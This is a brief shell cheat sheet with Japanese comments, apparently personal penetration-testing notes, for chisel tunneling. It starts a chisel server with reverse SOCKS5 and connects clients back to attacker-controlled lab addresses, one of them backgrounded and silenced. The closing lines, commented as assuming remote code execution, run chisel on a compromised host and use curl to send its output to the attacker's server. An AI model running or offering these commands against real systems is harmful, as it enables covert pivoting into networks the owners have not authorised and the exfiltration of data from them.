
```sh
# サーバ側
chisel server --port 8080 --reverse --socks5

# クライアント側
chisel client 192.168.118.4:8080 R:5555:socks # proxychainsのsocksポートを5555に指定
chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &

# クライアント側
# 出力を/tmp/outputに記録。curlで/tmp/outputの内容を送信（RCE想定）
chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/

./chisel client 192.168.45.221:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.221:8080/
```